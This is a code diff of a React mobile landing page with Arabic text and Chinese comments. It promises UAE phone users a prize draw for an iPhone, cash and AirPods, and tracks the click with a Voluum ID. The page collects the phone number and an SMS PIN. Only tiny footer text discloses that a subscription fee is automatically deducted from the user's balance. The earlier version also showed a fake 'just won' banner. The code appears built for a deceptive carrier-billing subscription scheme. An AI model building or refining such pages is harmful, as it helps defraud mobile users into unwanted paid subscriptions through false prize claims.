@@ -1,160 +1,332 @@
-import { useState, useEffect } from 'react';
+import { useState, useEffect } from "react";
 
 export default function Home() {
-  const [clickId, setClickId] = useState('');
-  const [msisdn, setMsisdn] = useState('');
-  const [pin, setPin] = useState('');
+  const [clickId, setClickId] = useState("");
+  const [msisdn, setMsisdn] = useState("");
+  const [pin, setPin] = useState("");
+  const [txid, setTxid] = useState("");
+  const [message, setMessage] = useState("");
   const [step, setStep] = useState(1);
-  const [txid, setTxid] = useState('');
-  const [message, setMessage] = useState('');
   const [loading, setLoading] = useState(false);
 
-  // 自动获取 Voluum 的 click_id
+  // 加载时自动捕获 Voluum 的 click_id
   useEffect(() => {
     const params = new URLSearchParams(window.location.search);
-    if (params.get('cid')) setClickId(params.get('cid'));
+    if (params.get("cid")) setClickId(params.get("cid"));
   }, []);
 
-  // 呼叫后台获取 PIN
-  const handleRequestPin = async () => {
+  // 1. 请求验证码 (智能清洗逻辑)
+  async function requestPIN() {
     if (!msisdn) {
-      setMessage('يرجى إدخال رقم الهاتف'); 
+      setMessage("يرجى إدخال رقم الهاتف");
       return;
     }
     
     setLoading(true);
-    setMessage('جاري التحقق...');
+    setMessage("جاري التحقق...");
 
-    // 号码智能清洗
     let cleanMsisdn = msisdn.trim();
-    if (cleanMsisdn.startsWith('0')) {
+    if (cleanMsisdn.startsWith("0")) {
       cleanMsisdn = cleanMsisdn.substring(1);
     }
-    if (!cleanMsisdn.startsWith('971')) {
-      cleanMsisdn = '971' + cleanMsisdn;
+    if (!cleanMsisdn.startsWith("971")) {
+      cleanMsisdn = "971" + cleanMsisdn;
     }
-    
-    try {
-      const res = await fetch('/api/request', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ msisdn: cleanMsisdn, click_id: clickId })
-      }).then(r => r.json());
 
-      if (res.success) {
-        setTxid(res.txid);
+    try {
+      const response = await fetch("/api/request", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ msisdn: cleanMsisdn, click_id: clickId })
+      });
+
+      const data = await response.json();
+
+      if (data.success) {
+        setTxid(data.txid);
         setStep(2);
-        setMessage(''); 
+        setMessage("✅ تم إرسال رمز التحقق إلى هاتفك");
       } else {
-        setMessage('❌ عذراً، هذا الرقم غير مؤهل حالياً. يرجى التأكد من أنه رقم اتصالات فعال.');
+        setMessage("❌ عذراً، هذا الرقم غير مؤهل حالياً. يرجى التأكد من أنه رقم اتصالات فعال.");
       }
-    } catch (err) {
-      setMessage('❌ حدث خطأ في الاتصال، يرجى المحاولة لاحقاً');
+    } catch (error) {
+      setMessage("❌ حدث خطأ في الاتصال، يرجى المحاولة لاحقاً");
     }
     setLoading(false);
-  };
+  }
 
-  // 呼叫后台验证 PIN
-  const handleVerifyPin = async () => {
+  // 2. 验证并回传转化
+  async function verifyPIN() {
     if (!pin) {
-      setMessage('يرجى إدخال رمز OTP');
+      setMessage("يرجى إدخال رمز OTP");
       return;
     }
-    
-    setLoading(true);
-    setMessage('جاري التأكيد...');
-    
-    try {
-      const res = await fetch('/api/verify', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ txid, pin, click_id: clickId })
-      }).then(r => r.json());
 
-      if (res.success) {
+    setLoading(true);
+    setMessage("جاري التأكيد...");
+
+    try {
+      const response = await fetch("/api/verify", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ txid, pin, click_id: clickId })
+      });
+
+      const data = await response.json();
+
+      if (data.success) {
         setStep(3);
-        setMessage('');
+        setMessage("");
       } else {
-        setMessage('❌ الرمز غير صحيح، حاول مرة أخرى');
+        setMessage("❌ الرمز غير صحيح، حاول مرة أخرى");
       }
-    } catch (err) {
-      setMessage('❌ حدث خطأ في الاتصال، يرجى المحاولة لاحقاً');
+    } catch (error) {
+      setMessage("❌ حدث خطأ في الاتصال، يرجى المحاولة لاحقاً");
     }
     setLoading(false);
-  };
+  }
 
   return (
-    <div dir="rtl" style={{ fontFamily: '"Tajawal", "Cairo", Arial, sans-serif', textAlign: 'center', padding: '20px', backgroundColor: '#111111', minHeight: '100vh', color: '#ffffff' }}>
-      
-      <div style={{ backgroundColor: '#202020', padding: '10px', fontSize: '12px', color: '#ffd700', borderRadius: '5px', marginBottom: '20px', maxWidth: '450px', margin: '0 auto 20px auto', border: '1px solid #333' }}>
-        ⚡️ فاز (أحمد م.) للتو بجهاز iPhone 17 Pro Max! 
+    <div style={styles.body}>
+      <div style={styles.badge}>🇦🇪 عرض حصري للإمارات</div>
+
+      <h1 style={styles.title}>اربح آيفون 16 برو</h1>
+      <p style={styles.subtitle}>أدخل رقم هاتفك الآن للدخول في السحب والفوز بجوائز حصرية</p>
+
+      <div style={styles.gift}>🎁</div>
+
+      {/* 针对手机端缩小的 3 张奖品卡片 */}
+      <div style={styles.cards}>
+        <div style={styles.card}>
+          <img src="https://i.ibb.co/B5tGx9x2/iphone-16.png" style={styles.image} />
+          <h3 style={styles.cardText}>iPhone 16</h3>
+        </div>
+        <div style={styles.card}>
+          <img src="https://i.ibb.co/S7WWWXJN/cash.png" style={styles.image} />
+          <h3 style={styles.cardText}>AED 10,000</h3>
+        </div>
+        <div style={styles.card}>
+          <img src="https://i.ibb.co/XZbtrpsJ/111851-sp880-airpods-Pro-2nd-gen.png" style={styles.image} />
+          <h3 style={styles.cardText}>AirPods Pro</h3>
+        </div>
       </div>
 
-      <div style={{ maxWidth: '450px', margin: '0 auto', background: 'linear-gradient(145deg, #222222, #1a1a1a)', padding: '35px 25px', borderRadius: '16px', boxShadow: '0 10px 30px rgba(0,0,0,0.5)', border: '1px solid #333' }}>
-        
-        <h1 style={{ color: '#ffd700', margin: '0 0 15px 0', fontSize: '28px', textShadow: '0 2px 4px rgba(255, 215, 0, 0.3)' }}>
-          🎁 السحب السنوي الأكبر! 🎁
-        </h1>
-        <p style={{ fontSize: '20px', fontWeight: 'bold', margin: '0 0 5px 0' }}>اربح <span style={{ color: '#ffd700' }}>iPhone 17 Pro Max</span> الجديد</p>
-        <p style={{ color: '#888', fontSize: '14px', marginBottom: '25px' }}>*عرض حصري لمشتركي <span style={{color: '#71c21b', fontWeight: 'bold'}}>Etisalat</span> في الإمارات</p>
-
+      {/* 干净利落的表单框 */}
+      <div style={styles.formBox}>
         {step === 1 && (
-          <div style={{ animation: 'fadeIn 0.5s' }}>
-            <p style={{ marginBottom: '15px', fontSize: '16px' }}>أدخل رقم هاتفك لتأكيد فرصتك في السحب:</p>
-            <input 
-              type="tel" 
-              placeholder="مثال: 541234567" 
-              value={msisdn}
-              onChange={(e) => setMsisdn(e.target.value.replace(/\D/g, ''))}
-              style={{ width: '90%', padding: '15px', marginBottom: '20px', border: '2px solid #444', borderRadius: '8px', fontSize: '18px', textAlign: 'center', backgroundColor: '#333', color: '#fff', outline: 'none', direction: 'ltr' }}
-            />
-            {/* 🔥 这里已经彻底硬编码成纯阿拉伯语的 "Win Now (اربح الآن)" */}
-            <button 
-              onClick={handleRequestPin} 
-              disabled={loading}
-              style={{ width: '90%', padding: '16px', backgroundColor: '#71c21b', color: '#000', border: 'none', borderRadius: '8px', fontSize: '20px', cursor: 'pointer', fontWeight: '900', boxShadow: '0 4px 15px rgba(113, 194, 27, 0.4)' }}
-            >
-              {loading ? 'انتظر...' : 'اربح الآن'}
+          <div>
+            <h2 style={styles.formTitle}>أدخل رقم هاتفك</h2>
+            <div style={styles.phoneBox}>
+              <input
+                type="tel"
+                placeholder="54XXXXXXX"
+                value={msisdn}
+                onChange={(e) => setMsisdn(e.target.value.replace(/\D/g, ""))}
+                style={styles.input}
+              />
+              <div style={styles.country}>+971</div>
+            </div>
+            <button onClick={requestPIN} disabled={loading} style={styles.yellowButton}>
+              {loading ? "جاري الطلب..." : "اربح الآن"}
             </button>
-            <p style={{ color: '#666', fontSize: '11px', marginTop: '15px', lineHeight: '1.4' }}>
-              بالضغط على الزر، أنت توافق على الشروط والأحكام. سيتم خصم رسوم الاشتراك من رصيدك تلقائياً.
-            </p>
           </div>
         )}
 
         {step === 2 && (
-          <div style={{ animation: 'fadeIn 0.5s' }}>
-            <div style={{ backgroundColor: '#1e3313', padding: '10px', borderRadius: '8px', marginBottom: '20px', border: '1px solid #71c21b' }}>
-              <p style={{ color: '#71c21b', margin: 0, fontWeight: 'bold' }}>✅ تم إرسال رمز PIN في رسالة قصيرة!</p>
-            </div>
-            <p style={{ marginBottom: '15px' }}>أدخل الرمز المكون من 4 أرقام لتأكيد اشتراكك:</p>
-            <input 
-              type="tel" 
-              placeholder="----" 
+          <div>
+            <h2 style={{...styles.formTitle, color: '#2ecc71'}}>أدخل رمز التأكيد</h2>
+            <input
+              type="tel"
+              placeholder="أدخل رمز OTP"
               value={pin}
               maxLength={4}
-              onChange={(e) => setPin(e.target.value.replace(/\D/g, ''))}
-              style={{ width: '90%', padding: '15px', marginBottom: '20px', border: '2px solid #ffd700', borderRadius: '8px', fontSize: '24px', textAlign: 'center', letterSpacing: '10px', backgroundColor: '#333', color: '#fff', outline: 'none', direction: 'ltr' }}
+              onChange={(e) => setPin(e.target.value.replace(/\D/g, ""))}
+              style={styles.otpInput}
             />
-            <button 
-              onClick={handleVerifyPin} 
-              disabled={loading}
-              style={{ width: '90%', padding: '16px', backgroundColor: '#ffd700', color: '#000', border: 'none', borderRadius: '8px', fontSize: '20px', cursor: 'pointer', fontWeight: '900', boxShadow: '0 4px 15px rgba(255, 215, 0, 0.4)' }}
-            >
-              {loading ? 'انتظر...' : 'تأكيد السحب'}
+            <button onClick={verifyPIN} disabled={loading} style={styles.greenButton}>
+              {loading ? "جاري التأكيد..." : "تأكيد الرمز"}
             </button>
           </div>
         )}
 
         {step === 3 && (
-          <div style={{ animation: 'fadeIn 0.5s', padding: '20px 0' }}>
-            <h2 style={{ color: '#71c21b', fontSize: '32px', margin: '0 0 15px 0' }}>🎉 مبروك! 🎉</h2>
-            <p style={{ fontSize: '18px', lineHeight: '1.5' }}>تم تأكيد اشتراكك بنجاح. لقد دخلت السحب الرسمي.<br/>سنقوم بالاتصال بك في حال فوزك!</p>
+          <div style={{ padding: "10px 0" }}>
+            <h2 style={{ color: "#2ecc71", fontSize: "32px", marginBottom: "15px" }}>🎉 تم الاشتراك بنجاح! 🎉</h2>
+            <p style={{ fontSize: "18px", color: "#333", lineHeight: "1.5" }}>لقد دخلت السحب الرسمي بنجاح.<br />سيتم التواصل معك قريباً في حال فوزك!</p>
           </div>
         )}
 
-        <p style={{ color: '#ff4444', marginTop: '20px', minHeight: '24px', fontWeight: 'bold' }}>{message}</p>
+        <div style={styles.message}>{message}</div>
+
+        <div style={styles.footer}>
+          ⚡ عدد الفائزين محدود يومياً
+          <br /><br />
+          بالمتابعة فإنك توافق على الشروط والأحكام. سيتم خصم رسوم الاشتراك من رصيدك تلقائياً.
+        </div>
       </div>
     </div>
   );
 }
+
+// 📱 专门针对手机屏幕优化的 CSS 样式 (缩小字号、优化边距)
+const styles = {
+  body: {
+    background: "linear-gradient(to bottom, #7b00b6, #3d0066)",
+    minHeight: "100vh",
+    padding: "15px",
+    textAlign: "center",
+    color: "white",
+    fontFamily: "Arial, sans-serif",
+    direction: "rtl"
+  },
+  badge: {
+    background: "#ffd500",
+    color: "#000",
+    display: "inline-block",
+    padding: "8px 24px",
+    borderRadius: "25px",
+    fontWeight: "bold",
+    fontSize: "14px",
+    marginTop: "10px",
+    boxShadow: "0 2px 8px rgba(0,0,0,0.2)"
+  },
+  title: {
+    fontSize: "32px",
+    marginTop: "20px",
+    marginBottom: "10px",
+    fontWeight: "900",
+    textShadow: "0 2px 4px rgba(0,0,0,0.5)"
+  },
+  subtitle: {
+    fontSize: "16px",
+    marginTop: "0",
+    lineHeight: "1.4",
+    padding: "0 10px",
+    color: "#e0e0e0"
+  },
+  gift: {
+    fontSize: "45px",
+    margin: "15px 0"
+  },
+  cards: {
+    display: "flex",
+    justifyContent: "center",
+    gap: "10px",
+    flexWrap: "wrap",
+    marginBottom: "25px"
+  },
+  card: {
+    width: "30%", // 手机上正好一排平分 3 个
+    background: "#8d2be2",
+    border: "2px solid #ffd500",
+    borderRadius: "15px",
+    padding: "10px",
+    boxShadow: "0 4px 10px rgba(0,0,0,0.3)"
+  },
+  image: {
+    width: "100%",
+    maxWidth: "55px",
+    height: "55px",
+    objectFit: "contain",
+    marginBottom: "5px"
+  },
+  cardText: {
+    fontSize: "12px",
+    margin: "0",
+    color: "white",
+    fontWeight: "bold"
+  },
+  formBox: {
+    background: "#efefef",
+    color: "black",
+    borderRadius: "25px",
+    padding: "25px 15px",
+    maxWidth: "100%",
+    boxShadow: "0 10px 25px rgba(0,0,0,0.4)"
+  },
+  formTitle: {
+    color: "#7b2be2",
+    fontSize: "24px",
+    marginBottom: "20px",
+    fontWeight: "900"
+  },
+  phoneBox: {
+    display: "flex",
+    flexDirection: "row",
+    border: "3px solid #cfd1d8",
+    borderRadius: "15px",
+    overflow: "hidden",
+    background: "white",
+    height: "60px",
+    direction: "ltr"
+  },
+  input: {
+    flex: 1,
+    border: "none",
+    fontSize: "22px",
+    textAlign: "center",
+    fontWeight: "bold",
+    outline: "none",
+    color: "#333"
+  },
+  country: {
+    width: "70px",
+    background: "#d9d9df",
+    display: "flex",
+    alignItems: "center",
+    justifyContent: "center",
+    fontSize: "18px",
+    fontWeight: "bold",
+    color: "#555"
+  },
+  yellowButton: {
+    width: "100%",
+    height: "60px",
+    border: "none",
+    borderRadius: "15px",
+    marginTop: "20px",
+    background: "#ffd500",
+    color: "black",
+    fontSize: "24px",
+    fontWeight: "bold",
+    cursor: "pointer",
+    boxShadow: "0 4px 12px rgba(255,213,0,0.4)"
+  },
+  otpInput: {
+    width: "100%",
+    height: "60px",
+    borderRadius: "15px",
+    border: "3px solid #cfd1d8",
+    fontSize: "24px",
+    textAlign: "center",
+    fontWeight: "bold",
+    outline: "none",
+    letterSpacing: "8px"
+  },
+  greenButton: {
+    width: "100%",
+    height: "60px",
+    border: "none",
+    borderRadius: "15px",
+    marginTop: "20px",
+    background: "#2ecc71",
+    color: "white",
+    fontSize: "24px",
+    fontWeight: "bold",
+    cursor: "pointer",
+    boxShadow: "0 4px 12px rgba(46,204,113,0.4)"
+  },
+  message: {
+    marginTop: "15px",
+    color: "#e74c3c",
+    fontSize: "16px",
+    fontWeight: "bold",
+    minHeight: "20px"
+  },
+  footer: {
+    marginTop: "20px",
+    fontSize: "12px",
+    lineHeight: "1.5",
+    color: "#666"
+  }
+};
